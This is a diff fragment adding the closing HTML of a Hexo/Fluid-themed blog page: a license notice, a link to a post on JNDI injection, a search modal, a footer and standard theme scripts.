+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              <A HREF="HTTPS://CREATIVECOMMONS.ORG/LICENSES/BY-NC-SA/4.0/">CC BY-NC-SA 4.0</A>
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/29/JNDI%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98/" title="JNDI注入挖掘">
+                        <span class="hidden-mobile">JNDI注入挖掘</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
